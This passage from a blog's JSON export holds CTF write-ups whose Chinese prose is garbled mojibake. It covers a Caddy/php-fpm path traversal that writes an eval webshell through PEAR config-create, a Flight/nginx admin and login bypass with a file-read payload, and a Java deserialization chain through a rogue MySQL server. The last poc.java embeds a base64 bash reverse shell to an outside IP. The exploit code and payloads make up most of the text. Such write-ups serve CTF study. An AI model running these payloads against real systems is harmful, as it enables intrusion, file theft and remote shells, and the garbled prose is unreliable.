caddyç‰ˆæœ¬ä¸º2.4.2ï¼Œä¼ é€’script_pathç»™php-fpmçš„æ—¶å€™å¯ä»¥ç›®å½•ç©¿è¶Šï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥å°è¯•è®©php-fpmè§£ææˆ‘ä»¬çš„æŒ‡å®šæ–‡ä»¶ è¯¥æ¼æ´2.4.3ä¹‹åå°±ä¿®å¤äº†ï¼Œå¯ä»¥åœ¨https://github.com/caddyserver/caddy/commit/9d4ed3a3236df06e54c80c4f6633b66d68ad3673 çœ‹åˆ°å…·ä½“ä¿®å¤ 0x02å¯ç”¨çš„phpæ–‡ä»¶ï¼Œè‡ªå·±åœ¨æœ¬åœ°ç”¨dockerå»ºäº†ä¸ªç¯å¢ƒï¼Œæ‰¾ä¸€ä¸‹phpæ–‡ä»¶ å¯ä»¥çœ‹åˆ°ï¼Œpearæ‰©å±•åŒ… 0x03 å†™é©¬å¯ä»¥åœ¨ç½‘ä¸Šæ‰¾åˆ°pearçš„ç”¨æ³•ï¼Œå…¶ä¸­pear config-create xxx xxxç”¨äºåˆ›å»ºä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºhomeç›®å½•ï¼Œè¿™ä¸ªå‚æ•°ä¼šå‡ºç°åœ¨é…ç½®æ–‡ä»¶ä¸­ æ‰€ä»¥å¯ä»¥è¿™æ ·å†™é©¬ 1pear config-create &#x2F;tmp&#x2F;&lt;?&#x3D;eval($_POST[1]);?&gt; &#x2F;tmp&#x2F;shell.php 12345678GET &#x2F;..&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;peclcmd.php?+config-create+&#x2F;tmp&#x2F;&lt;?&#x3D;eval($_POST[1]);?&gt;+&#x2F;tmp&#x2F;shell.php HTTP&#x2F;1.1Host: 192.168.231.248:54120Upgrade-Insecure-Requests: 1User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;93.0.4577.82 Safari&#x2F;537.36Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q&#x3D;0.9Connection: close åœ¨æœ¬åœ°ç¯å¢ƒæµ‹è¯•ï¼Œshell.phpä¼šè¢«åˆ›å»ºï¼Œè€Œä¸”å†…å®¹ä¸º æˆåŠŸå†™ç ï¼Œæ¥ä¸‹æ¥ç›®å½•ç©¿è¶Šè®¿é—®å°±å¯ä»¥äº†","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"other","slug":"CTF/other","permalink":"https://123-prog.github.io/categories/CTF/other/"}],"tags":[{"name":"caddy+php-fpmç›®å½•ç©¿è¶Š","slug":"caddy-php-fpmç›®å½•ç©¿è¶Š","permalink":"https://123-prog.github.io/tags/caddy-php-fpm%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A/"},{"name":"åˆ©ç”¨pearæ‰©å±•åº“å†™é©¬","slug":"åˆ©ç”¨pearæ‰©å±•åº“å†™é©¬","permalink":"https://123-prog.github.io/tags/%E5%88%A9%E7%94%A8pear%E6%89%A9%E5%B1%95%E5%BA%93%E5%86%99%E9%A9%AC/"}]},{"title":"(RCTF2021) Easyphp","slug":"RCTF2021-Easyphp","date":"2021-09-16T14:04:12.000Z","updated":"2021-09-22T10:21:21.134Z","comments":true,"path":"2021/09/16/RCTF2021-Easyphp/","link":"","permalink":"https://123-prog.github.io/2021/09/16/RCTF2021-Easyphp/","excerpt":"0x01 é¢˜ç›®ç»™äº†æºç å’Œnginxé…ç½®æ–‡ä»¶ï¼Œä¸»è¦æ˜¯é…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹","text":"0x01 é¢˜ç›®ç»™äº†æºç å’Œnginxé…ç½®æ–‡ä»¶ï¼Œä¸»è¦æ˜¯é…ç½®æ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849server &#123; listen 80; listen [::]:80; server_name localhost; #access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;host.access.log main; root &#x2F;var&#x2F;www&#x2F;html; location &#x2F;admin &#123; allow 127.0.0.1; deny all; &#125; location &#x2F; &#123; index index.php; try_files $uri @phpfpm; &#125; #error_page 404 &#x2F;404.html; # redirect server error pages to the static page &#x2F;50x.html # error_page 500 502 503 504 &#x2F;50x.html; location &#x3D; &#x2F;50x.html &#123; root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html; &#125; # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ &#123; # proxy_pass http:&#x2F;&#x2F;127.0.0.1; #&#125; # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # location @phpfpm &#123; include fastcgi_params; fastcgi_split_path_info ^(.+?\\.php)(&#x2F;.*)$; fastcgi_pass php:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root&#x2F;index.php; fastcgi_param REQUEST_URI $uri; &#125; # deny access to .htaccess files, if Apache&#39;s document root # concurs with nginx&#39;s one # #location ~ &#x2F;\\.ht &#123; # deny all; #&#125;&#125; æ³¨æ„å‡ ä¸ªå…³é”®ç‚¹ï¼š åŒ¹é…è·¯å¾„/adminä¼šè¢«wafæ‰ï¼Œåªå…è®¸æœ¬åœ°è®¿é—® ä¼ é€’ç»™fastcgiçš„å‚æ•°ï¼ŒSCRIPT_FILENAMEå†™æ­»çš„ï¼Œä¸ºindex.phpï¼Œå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è®¿é—®çš„ä»»ä½•è·¯å¾„ï¼Œfastcgiè§£æçš„æ°¸è¿œéƒ½æ˜¯index.phpï¼Œindex.phpä¸­æœ‰å„ç§è·¯ç”±è´Ÿè´£å®ç°å„ç§åŠŸèƒ½ REQUEST_URI è®¾ä¸º $uriï¼Œ$uriä¸ºnginxé…ç½®çš„å†…ç½®å‚æ•°ï¼Œä¸ºè®¿é—®è·¯å¾„ï¼Œä¸åŒ…å«queryéƒ¨åˆ†ï¼Œæ¯”å¦‚è·¯å¾„http://example.com/test/doc?a=1çš„$uriå°±æ˜¯/test/docï¼Œè€Œä¸”è¿™ä¸ªå‚æ•°ä¹Ÿä¼šå¯¹åº”phpä»£ç ä¸­çš„$_SERVER[&#39;REQUEST_URI&#39;] 0x02 å®¡è®¡$request-&gt;urlï¼šç›®æ ‡æ˜¯è®¿é—®åˆ°/adminï¼Œè·¯ç”±ä¸‹æœ‰ä»»æ„æ–‡ä»¶è¯»å– 123456$app-&gt;route(&#x27;/admin&#x27;, function()&#123; global $app; $request = $app-&gt;request(); $app-&gt;render(&quot;admin&quot;,[&quot;data&quot;=&gt;&quot;./&quot;.$request-&gt;query-&gt;data],&quot;body_content&quot;); $app-&gt;render(&quot;template&quot;,[]);&#125;); ä½†æœ‰å¾ˆå¤šé™åˆ¶ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ªå°±æ˜¯nginxé…ç½®ä¸­çš„é™åˆ¶ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è®¿é—®/adminï¼Œä¼šç›´æ¥æŠ¥403 è¿™é‡Œå°±æœ‰ä¸€ä¸ªæ€è·¯ï¼Œflightçš„è·¯ç”±è§£æå¦‚æœæœ‰æ¼æ´çš„è¯ï¼Œæ˜¯å¦å¯ä»¥è®¿é—®æŸä¸ªä¸æ˜¯/adminå¼€å¤´çš„è·¯å¾„ï¼Œå´å¯ä»¥è¢«è§£æåˆ°/adminçš„è·¯å¾„ï¼Œè¿™æ ·çš„è¯nginxçš„é™åˆ¶å°±å¯ä»¥è§£é™¤äº† è¿˜æœ‰ä¸€ä¸ªé™åˆ¶ 12345678910111213$app-&gt;route(&#x27;/*&#x27;, function()&#123; global $app; $request = $app-&gt;request(); $app-&gt;render(&quot;head&quot;,[],&quot;head_content&quot;); if(stristr($request-&gt;url,&quot;login&quot;)!==FALSE)&#123; return true; &#125;else&#123; if($_SESSION[&quot;user&quot;])&#123; return true; &#125; $app-&gt;redirect(&quot;/login&quot;); &#125;&#125;); è¿™æ˜¯ä¸€ä¸ªè¿‡æ»¤ï¼ŒéªŒè¯ä½ æ˜¯å¦ç™»é™†è¿‡ï¼Œä½†æ³¨æ„åˆ°è¿™ä¸ªifåˆ¤æ–­ï¼Œåªè¦$request-&gt;urlä¹‹ä¸­åŒ…å«loginï¼Œä¹Ÿå°±å¯ä»¥ç»•è¿‡ é˜…è¯»æºç ï¼Œ$request-&gt;urlæ¥è‡ª$_SERVER[&#39;REQUEST_URI&#39;]ï¼Œåˆå§‹åŒ–çš„æ—¶å€™ä¼šè¿›ä¸€æ­¥å¤„ç†ï¼Œå¤„ç†ä¸º 123if ($this-&gt;base != &#x27;/&#x27; &amp;&amp; strlen($this-&gt;base) &gt; 0 &amp;&amp; strpos($this-&gt;url, $this-&gt;base) === 0) &#123; $this-&gt;url = substr($this-&gt;url, strlen($this-&gt;base));&#125; ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœè®¿é—®è·¯å¾„ä¸º/a/aa/aaaï¼Œç»è¿‡å¤„ç†ï¼Œè¿™é‡Œç›´æ¥æˆªå–äº†baseï¼Œå°±ä¼šå˜æˆ/aaaï¼Œå³å¯¹åº”$request-&gt;urlä¸º/aaaï¼Œå¯ä»¥åœ¨æœ¬åœ°ç¯å¢ƒä¸­å¾—åˆ°éªŒè¯ routeï¼šä¸‹é¢å®¡è®¡ä»¥ä¸‹flightçš„è·¯ç”±åŒ¹é…è§„åˆ™ è·¯ç”±å‡½æ•° 1234567891011public function route(Request $request) &#123; $url_decoded = urldecode( $request-&gt;url ); while ($route = $this-&gt;current()) &#123; if ($route !== false &amp;&amp; $route-&gt;matchMethod($request-&gt;method) &amp;&amp; $route-&gt;matchUrl($url_decoded, $this-&gt;case_sensitive)) &#123; return $route; &#125; $this-&gt;next(); &#125; return false; &#125; é¦–å…ˆä¼šå¯¹$request-&gt;urlè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼ŒåŒ¹é…urlçš„å‡½æ•°ä¸ºmatchUrlï¼Œè·Ÿè¿›è¿™ä¸ªå‡½æ•° å‘ç°åŒ¹é…è§„åˆ™ 123456789if (preg_match(&#x27;#^&#x27;.$regex.&#x27;(?:\\?.*)?$#&#x27;.(($case_sensitive) ? &#x27;&#x27; : &#x27;i&#x27;), $url, $matches)) &#123; foreach ($ids as $k =&gt; $v) &#123; $this-&gt;params[$k] = (array_key_exists($k, $matches)) ? urldecode($matches[$k]) : null; &#125; $this-&gt;regex = $regex; return true; &#125; è¿™é‡Œä¼ å…¥çš„å‚æ•°ä¸º$urlï¼Œè¿™ä¸ªå‚æ•°æ˜¯ä¸€æ¬¡urlè§£ç ä¹‹åçš„$request-&gt;urlï¼ŒåŒ¹é…çš„è¯ï¼Œåªè¦è¿™ä¸ªä»¥/adminå¼€å¤´ï¼Œå°±åŒ¹é…æˆåŠŸï¼Œå°±ä¼šè°ƒç”¨å¯¹åº”çš„å›è°ƒå‡½æ•° é‡ç‚¹æ¥äº†ï¼Œ$request-&gt;urlåœ¨å‰é¢åˆ†æè¿‡ï¼Œåœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¼šç»è¿‡ä¸€ä¸ªæˆªå–ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬è®¿é—®/aaa/adminï¼Œ$request-&gt;urlå¯¹åº”çš„æ˜¯/adminï¼Œflightçš„è·¯ç”±ä¼šè°ƒç”¨/adminå¯¹åº”çš„å›è°ƒå‡½æ•°ï¼Œè€Œä¸”/aaa/adminè¿™ä¸ªè·¯å¾„ä¹Ÿä¸ä¼šåŒ¹é…nginxé…ç½®çš„wafï¼ŒæˆåŠŸç»•è¿‡ç¬¬ä¸€ä¸ªé™åˆ¶ ç°åœ¨æˆ‘ä»¬è®¿é—®/aaa/adminå°±å¯ä»¥åˆ°adminè·¯ç”±ä¸‹äº†ï¼Œä½†æ˜¯å› ä¸ºæ²¡æœ‰ç™»å½•ï¼Œä¼šè·³è½¬åˆ°loginå¤„ loginï¼šå‰é¢ä¹Ÿåˆ†æäº†ï¼Œåªè¦$request-&gt;urlåŒ…å«loginç¬¬äºŒä¸ªé—®é¢˜ä¹Ÿè§£å†³äº† è·¯ç”±æ‹¿åˆ°$request-&gt;urlå‚æ•°åçš„æ­£åˆ™åŒ¹é…æ˜¯å…è®¸åé¢å¸¦æœ‰query è™½ç„¶æˆ‘ä»¬ç”±äºnginxçš„é…ç½®å¯¼è‡´$request-&gt;urlä¸ä¼šåŒ…å«queryï¼Œä½†å¦‚æœæˆ‘ä»¬ä¼ å…¥è·¯å¾„/aaa/admin%3flogin=1ï¼Œç”±äºæ˜¯urlç¼–ç ï¼ŒæœåŠ¡å™¨è§£æè·¯å¾„çš„æ—¶å€™æŠŠè¿™ä¸€æ•´ä¸ªéƒ½å½“ä½œè·¯å¾„ï¼Œè€Œä¸ä¼šè®¤ä¸ºåé¢loginæ˜¯å‚æ•°ï¼Œæ‰€ä»¥æ­¤æ—¶çš„$request-&gt;urlä¸º/admin?login=1ï¼Œè·¯ç”±åŒ¹é…å¯ä»¥é€šè¿‡ï¼Œä¹Ÿè¾¾åˆ°äº†$request-&gt;urlåŒ…å«loginç»•è¿‡ç™»å½•çš„è¦æ±‚ æ‰€ä»¥æœ€åçš„payloadä¸º /aaa/admin%3flogin=1&amp;data=..%252F..%252F..%252F..%252F..%252Fflag æ³¨æ„dataå‚æ•°ä¸­åŒ…å«çš„/éœ€è¦ç»è¿‡ä¸¤æ¬¡urlç¼–ç ï¼Œå¦åˆ™ï¼Œ$request-&gt;urlæˆªå–åä¼šå˜æˆ/flagï¼Œä¸»è¦æ˜¯ä¿è¯/adminåæ²¡æœ‰/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://123-prog.github.io/categories/CTF/"},{"name":"phpä»£ç å®¡è®¡","slug":"CTF/phpä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/categories/CTF/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"nginxè·¯å¾„è§£æç»•è¿‡","slug":"nginxè·¯å¾„è§£æç»•è¿‡","permalink":"https://123-prog.github.io/tags/nginx%E8%B7%AF%E5%BE%84%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87/"},{"name":"flightæ¡†æ¶ä»£ç å®¡è®¡","slug":"flightæ¡†æ¶ä»£ç å®¡è®¡","permalink":"https://123-prog.github.io/tags/flight%E6%A1%86%E6%9E%B6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]},{"title":"(ç¾ŠåŸæ¯ 2020)A Piece Of Java","slug":"ç¾ŠåŸæ¯-2020-A-Piece-Of-Java","date":"2021-09-06T15:26:05.000Z","updated":"2021-09-22T10:20:49.735Z","comments":true,"path":"2021/09/06/ç¾ŠåŸæ¯-2020-A-Piece-Of-Java/","link":"","permalink":"https://123-prog.github.io/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/","excerpt":"0x01 æºç å®¡è®¡ä¸»æ§åˆ¶å™¨ä¸‹çš„è·¯ç”±/helloï¼Œå­˜åœ¨ä»å¤–ç•Œè¾“å…¥è·å–åºåˆ—åŒ–æ•°æ®å¹¶è¿›è¡Œååºåˆ—åŒ–çš„æ“ä½œ","text":"0x01 æºç å®¡è®¡ä¸»æ§åˆ¶å™¨ä¸‹çš„è·¯ç”±/helloï¼Œå­˜åœ¨ä»å¤–ç•Œè¾“å…¥è·å–åºåˆ—åŒ–æ•°æ®å¹¶è¿›è¡Œååºåˆ—åŒ–çš„æ“ä½œ çœ‹ä¸€ä¸‹deserialize() è¿™é‡Œçš„é…ç½®æ–‡ä»¶serialkiller.confé‡Œé¢è®¾ç½®äº†ç™½åå• 1234&lt;whitelist&gt; &lt;regexp&gt;gdufs\\..*&lt;&#x2F;regexp&gt; &lt;regexp&gt;java\\.lang\\..*&lt;&#x2F;regexp&gt;&lt;&#x2F;whitelist&gt; åºåˆ—åŒ–åªä¼šåºåˆ—åŒ–ç™½åå•é‡Œçš„ç±»ï¼Œè¿™æ ·é™åˆ¶äº†æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨ æ³¨æ„åˆ°/helloè·¯ç”±ååºåˆ—åŒ–äº†Infoç±»ï¼Œè€Œä¸”å­˜åœ¨ä¸€ä¸ªåŠ¨æ€ä»£ç† Infoæ˜¯ä¸€ä¸ªæ¥å£ç±»ï¼ŒDatabaseInfoå’ŒUserInfoå®ç°è¿™ä¸ªæ¥å£ï¼Œæ˜¯ä¸¤ä¸ªå§”æ‰˜ç±»ï¼Œçœ‹ä¸€ä¸‹åŠ¨æ€ä»£ç†ç±»è¦†å†™çš„invokeæ–¹æ³• åˆ¤æ–­æ–¹æ³•åæ˜¯å¦ä¸ºgetAllInfoï¼Œå¹¶ä¸”ä¼šæ‰§è¡ŒcheckAllInfo()ï¼Œåˆšå¥½åœ¨DatabaseInfoç±»ä¸­çš„checkAllInfo()å­˜åœ¨è¿æ¥æ•°æ®åº“çš„è¡Œä¸ºï¼Œå‚æ•°è¿˜å…¨éƒ½å¯æ§ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ„é€ pocï¼Œæ„é€ ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»å®ä¾‹ï¼Œä»£ç†DatabaseInfoçš„æ“ä½œï¼Œå¯¹å…¶åºåˆ—åŒ–ï¼Œä½œä¸ºååºåˆ—åŒ–çš„æ•°æ® /helloè·¯ç”±æ‹¿åˆ°æ•°æ®ååºåˆ—åŒ–ä¹‹åï¼Œä¼šè°ƒç”¨getAllInfo()æ–¹æ³•ï¼Œå› ä¸ºåŠ¨æ€ä»£ç†çš„åŸå› ï¼Œä¼šè°ƒç”¨ä»£ç†ä¸­çš„invokeæ–¹æ³•ï¼Œé—´æ¥åœ°è°ƒç”¨äº†checkAllInfo()æ–¹æ³•è¿æ¥æ•°æ®åº“ï¼Œè€Œä¸”jdbcçš„urlç”¨çš„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œå®Œå…¨å¯æ§ poc.java 1234567891011121314151617181920212223242526272829303132333435363738import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;public class poc&#123; public static void main(String[] args) throws IOException&#123; DatabaseInfo dataInfo = new DatabaseInfo(); //å®ä¾‹ä¸€ä¸ªDatabaseInfoç±» dataInfo.setHost(&quot;127.0.0.1&quot;); dataInfo.setPort(&quot;3306&quot;); //è®¾ç½®ä¸ºè¿œç¨‹ä¸»æœºçš„ip:port dataInfo.setUsername(&quot;fileread_/flag_AQUA&quot;); dataInfo.setPassword(&quot;123&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true&quot;); //é€šè¿‡Usernameå’ŒPasswordæ§åˆ¶jdbcçš„url ClassLoader classLoader = dataInfo.getClass().getClassLoader(); Class[] interfaces = dataInfo.getClass().getInterfaces(); InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(dataInfo); Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, infoInvocationHandler); //æ–°å»ºåŠ¨æ€ä»£ç†å®ä¾‹ï¼Œéœ€è¦è·å–å§”æ‰˜ç±»çš„ClassLoaderå’Œæ¥å£æ•°ç»„ï¼Œå°†DatabaseInfoçš„å®ä¾‹ä½œä¸ºå‚æ•°ä¼ å…¥ //InfoInvocationHandleræ„é€ å‡½æ•°è·å–ä»£ç†å®ä¾‹ï¼Œæœ€åæ‹¿åˆ°proxyï¼Œé€šè¿‡ä»£ç†è°ƒç”¨å§”æ‰˜ç±»çš„æ–¹æ³•ï¼Œä¼šè°ƒç”¨ä»£ //ç†ç±»è¦†å†™çš„invokeæ–¹æ³•ä½œä¸ºä»£æ›¿ ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos); objectOutputStream.writeObject(proxy); objectOutputStream.flush(); objectOutputStream.close(); System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray()))); //åºåˆ—åŒ–æ•°æ® &#125;&#125; æ‹¿åˆ°base64ä¸²ä½œä¸ºcookieçš„dataå€¼ï¼Œå³å¯å®ç°å¯¹ä»»æ„mysqlæœåŠ¡ç«¯çš„è¿æ¥ 0x02 è§£æ³•ä¸€ï¼šmysqlæ¶æ„æœåŠ¡ç«¯è¯»å–æ–‡ä»¶åˆ©ç”¨å·¥å…·åœ¨vpsä¸Šæ„é€ æ¶æ„mysqlæœåŠ¡ç«¯ https://github.com/fnmsd/MySQL_Fake_Server æ„é€ æ¶æ„mysqlæœåŠ¡ç«¯ï¼Œä»¤è¿æ¥å®¢æˆ·ç«¯å‘é€å…¶æœ¬åœ°æ–‡ä»¶å†…å®¹åˆ°æœåŠ¡ç«¯ï¼Œå®ç°ä»»æ„è¯»å–æ–‡ä»¶ ä¾‹å¦‚ï¼Œè¿™é‡Œç›´æ¥å†™jdbcçš„urlä½œä¸ºä¾‹å­ jdbc:mysql://127.0.0.1:3306/jdbc?user=fileread_/etc/passwd&amp;password=xxx&amp;allowLoadLocalInfile=true jdbc:mysql://127.0.0.1:3306/jdbc?user=fileread_file:///&amp;password=xxx&amp;allowLoadLocalInfile=true&amp;allowUrlInLocalInfile=true allowLoadLocalInfileä¸ºmysql jdbcçš„é…ç½®é€‰é¡¹ï¼Œå…è®¸mysqlä½¿ç”¨LOAD DATA LOCAL INFILE ...è¯»å–æ–‡ä»¶ï¼Œå¦åˆ™å¯èƒ½è¯»å–ä¸åˆ°æ–‡ä»¶å†…å®¹ allowUrlInLocalInfileä¹Ÿæ˜¯é…ç½®é¡¹ï¼Œé¡¾åæ€ä¹‰ï¼Œæ‰“å¼€çš„è¯ï¼Œå…è®¸åœ¨LOAD DATA LOCAL INFILE ...è§£æurlsï¼Œå„ç§åè®®éƒ½å¯ä»¥å°è¯•ï¼Œå¯ä»¥ä½¿ç”¨httpå®ç°SSRFï¼Œæˆ–è€…fileåè®®è¯»å–æ–‡ä»¶ï¼Œç›®å½•ç»“æ„ï¼Œå¦‚ä¸Šä¾‹å­2 æ‰€ä»¥è§£æ³•ä¸€å°±æ˜¯åˆ©ç”¨æ¶æ„æœåŠ¡ç«¯è¯»å–æ ¹ç›®å½•ç»“æ„ï¼Œå‘ç°flagæ–‡ä»¶ç›´æ¥è¯» æ„é€ jdbc url 1&#96;jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;jdbc?user&#x3D;fileread_file:&#x2F;&#x2F;&#x2F;&amp;password&#x3D;xxx&amp;allowLoadLocalInfile&#x3D;true&amp;allowUrlInLocalInfile&#x3D;true&#96; è¯»å–æ ¹ç›®å½•ç»“æ„ å‘ç°flagæ–‡ä»¶ï¼Œæ›´æ”¹jdbc url 1jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;jdbc?user&#x3D;fileread_&#x2F;flag_AQUA&amp;password&#x3D;xxx&amp;allowLoadLocalInfile&#x3D;true è¯»å–flag 0x02 è§£æ³•äºŒï¼šmysqlæ¶æ„æœåŠ¡ç«¯+javaååºåˆ—åŒ–mysqlæ¶æ„æœåŠ¡ç«¯ä¸ä»…ä»…å¯ä»¥è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶ï¼Œè¿˜å¯ä»¥è®©å®¢æˆ·ç«¯å¯¹æœåŠ¡ç«¯æ•°æ®è¿›è¡Œååºåˆ—åŒ–è§¦å‘javaååºåˆ—åŒ–æ¼æ´ mysql-connectorçš„ç‰ˆæœ¬ä¸ä¸€æ ·ï¼Œè§¦å‘ååºåˆ—åŒ–çš„ç‚¹å°±ä¸ä¸€æ ·ï¼Œå¦‚ä¸‹ 123456789101112131415161718192021ServerStatusDiffInterceptorè§¦å‘8.x: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc6.x(å±æ€§åä¸åŒ): jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc5.1.11åŠä»¥ä¸Šçš„5.xç‰ˆæœ¬ï¼ˆåŒ…åæ²¡æœ‰äº†cjï¼‰: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc5.1.10åŠä»¥ä¸‹çš„5.1.Xç‰ˆæœ¬ï¼š åŒä¸Šï¼Œä½†æ˜¯éœ€è¦è¿æ¥åæ‰§è¡ŒæŸ¥è¯¢ã€‚5.0.x: è¿˜æ²¡æœ‰ServerStatusDiffInterceptorè¿™ä¸ªä¸œè¥¿â”“( Â´âˆ€&#96; )â”detectCustomCollationsè§¦å‘ï¼š5.1.41åŠä»¥ä¸Š: ä¸å¯ç”¨5.1.29-5.1.40: jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?detectCustomCollations&#x3D;true&amp;autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc5.1.28-5.1.19ï¼š jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;user&#x3D;yso_JRE8u20_calc5.1.18ä»¥ä¸‹çš„5.1.xç‰ˆæœ¬ï¼š ä¸å¯ç”¨5.0.xç‰ˆæœ¬ä¸å¯ç”¨ çœ‹ä¸€ä¸‹ä¾èµ–ï¼Œæ˜¯8.0.19ç‰ˆæœ¬ 12345&lt;dependency&gt; &lt;groupId&gt;mysql&lt;&#x2F;groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;&#x2F;artifactId&gt; &lt;version&gt;8.0.19&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt; æ‰€ä»¥è§¦å‘ååºåˆ—åŒ–çš„payloadåº”è¯¥åƒä¸‹é¢ä¸€æ · 1jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;test?autoDeserialize&#x3D;true&amp;queryInterceptors&#x3D;com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user&#x3D;yso_JRE8u20_calc åŒæ ·ä½¿ç”¨ä¸Šé¢çš„æ¶æ„MysqlæœåŠ¡ç«¯ æ„é€ ç”¨æˆ·åä¸ºyso_CommonsCollections5_commandï¼Œcommandæ¢æˆå¼¹shellçš„å‘½ä»¤å°±å¯ä»¥ï¼Œè¿™é‡Œç”¨åˆ°äº†ysoserialä¸­çš„cc5é“¾ï¼Œå› ä¸ºåœ¨ä¾èµ–ä¸­serialkillerä¸º3.0ç‰ˆæœ¬ï¼ŒæŸ¥çœ‹å¯¹åº”ä¾èµ–ï¼Œå¯ä»¥å‘ç°Commons-Collections 3.2.1çš„ä¾èµ–ï¼Œå¯¹åº”åˆ©ç”¨é“¾cc5ï¼Œysoserialä¸‹è½½åœ°å€https://github.com/angelwhu/ysoserialï¼Œåœ¨æ¶æ„mysqlç›®å½•ä¸‹çš„`config.json`æ–‡ä»¶é…ç½®ysoserialè·¯å¾„ poc.java 123456789101112131415161718192021222324252627282930313233343536import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;import gdufs.challenge.web.invocation.InfoInvocationHandler;import gdufs.challenge.web.model.DatabaseInfo;import gdufs.challenge.web.model.Info;public class poc&#123; public static void main(String[] args) throws IOException&#123; DatabaseInfo dataInfo = new DatabaseInfo(); dataInfo.setHost(&quot;xxx.xxx.xxx.xxx&quot;); dataInfo.setPort(&quot;3306&quot;); dataInfo.setUsername(&quot;yso_CommonsCollections5_bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjEuMzcuMTAuMjU0LzEwMDAgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D&quot;); //yso_CommonsCollections5_commandï¼Œå‘Šè¯‰ä¼ªé€ mysqlæœåŠ¡ç”¨çš„é‚£ä¸€æ¡é“¾ dataInfo.setPassword(&quot;123&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;); //è§¦å‘ååºåˆ—åŒ–çš„é…ç½® ClassLoader classLoader = dataInfo.getClass().getClassLoader(); Class[] interfaces = dataInfo.getClass().getInterfaces(); InfoInvocationHandler infoInvocationHandler = new InfoInvocationHandler(dataInfo); Info proxy = (Info) Proxy.newProxyInstance(classLoader, interfaces, infoInvocationHandler); //è€ä¸‰æ · ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(baos); objectOutputStream.writeObject(proxy); objectOutputStream.flush(); objectOutputStream.close(); System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray()))); &#125;&#125; 